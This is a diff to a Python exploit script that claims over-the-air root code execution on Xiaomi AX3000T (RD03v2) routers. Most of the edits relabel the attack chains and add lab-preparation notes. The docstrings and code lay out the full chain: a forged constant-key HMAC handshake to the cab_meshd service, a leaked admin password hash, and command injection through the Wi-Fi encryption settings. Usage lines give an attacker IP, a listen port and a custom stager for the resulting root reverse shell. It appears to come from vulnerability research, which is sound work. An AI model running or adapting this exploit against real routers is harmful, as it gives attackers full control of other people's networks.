@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """Over-the-air root RCE in a gate-open RD03v2 stock 2.0.28 state.
 
-Combines Chain 1 (admin takeover via cab_meshd) and Chain 2 (root command
-execution via mgmt_2g/mgmt_5g encryption injection) into a single attack
+Combines V1 (admin takeover via cab_meshd) and V2 (root command execution via
+mgmt_2g/mgmt_5g encryption injection) into a single CAP delivery path
 that yields an interactive root reverse shell -- from a client already on
 Wi-Fi, without router-admin or mesh credentials, a WAN cable, or user
-interaction during the chain.
+interaction during the V1/V2 run.
 
 The attack has three phases:
 
-  Phase A — Admin takeover (Chain 1).
+  Phase A — V1 admin takeover.
     Connect to cab_meshd on TCP 19553, forge the constant-key HMAC handshake
     (firmware-global key, SSL_VERIFY_NONE), reach ST_RUNNING, and leak
     web_passwd256 from the sync config. Mint an admin session with
@@ -44,12 +44,19 @@ NETMODE unset:
   - Interactive root shell: BusyBox ash, uid=0(root), Linux XiaoQiang 4.4.60
 
 Prerequisites:
+  - Laboratory preparation completed separately: factory reset, then
+    `init_router.py --host 192.168.31.1 --reboot`. This script does not create
+    the tested gate-open CAP state.
   - Wi-Fi (or LAN) adjacency to an initialized RD03v2 (INITTED=YES).
   - TCP 19553 reachable and get_netmode returning numeric 0. The normal web
     wizard can set whc_cap (4), which blocks this CAP root path.
-  - No router-admin or mesh credentials, no prior foothold.
+  - After that preparation, the V1/V2 run needs no router-admin or mesh
+    credentials and no additional foothold.
 
 Usage:
+    # one-time laboratory preparation after a factory reset:
+    python3 init_router.py --host 192.168.31.1 --reboot
+
     python3 ota_rce.py --host 192.168.31.1
     python3 ota_rce.py --host 192.168.31.1 --attacker 10.0.0.5 --listen-port 9999
     python3 ota_rce.py --host 192.168.31.1 --stager ./my_payload.sh
@@ -147,7 +154,7 @@ def http_call(url, data=None, timeout=45):
             time.sleep(6)
 
 
-# ---- Phase A: admin takeover (Chain 1) ----
+# ---- Phase A: V1 admin takeover ----
 
 
 def leak_admin_hash(host, port, ident, timeout):
@@ -454,13 +461,16 @@ def main():
         description="Over-the-air root RCE on a gate-open Xiaomi AX3000T (RD03v2).",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=textwrap.dedent("""\
-            Combines Chain 1 (admin hash leak via cab_meshd) and Chain 2 (root
-            eval via encryption injection) into a single over-the-air attack
+            Combines V1 (admin hash leak via cab_meshd) and V2 (root eval via
+            encryption injection) into a single over-the-air CAP delivery
             that yields an interactive root reverse shell.
 
             The tested attack is over Wi-Fi, requires no router-admin or mesh
-            credentials, and needs NETMODE=0. The device stays online through
-            the demonstrated run (self-repairing payload).
+            credentials, and needs NETMODE=0. The router does not reboot; Wi-Fi
+            briefly drops and returns with the self-repaired WPA2 configuration.
+
+            Laboratory preparation before this script:
+              python3 init_router.py --host 192.168.31.1 --reboot
 
             Example:
               Terminal 1:  python3 ota_rce.py --host 192.168.31.1
@@ -503,7 +513,7 @@ def main():
     # Phase A
     log("")
     log("=" * 60)
-    log("  Phase A: admin takeover (Chain 1)")
+    log("  Phase A: V1 admin takeover")
     log("=" * 60)
     h256 = leak_admin_hash(args.host, args.port, args.id.encode(), args.timeout)
     if not h256:
@@ -524,8 +534,8 @@ def main():
         )
     except Exception as e:                                       # noqa: BLE001
         log(f"[-] CAP root path not confirmed open: {e}")
-        log("[-] Nothing was planted or triggered. See CORRECTIONS.md for the")
-        log("[-] difference between normal web setup and minimal initialization.")
+        log("[-] Nothing was planted or triggered. See v2-root-rce.md for the")
+        log("[-] required gate-open CAP preparation and normal-wizard boundary.")
         return 1
     log(f"[*] NETMODE={netmode} (tested gate-open state)")
 
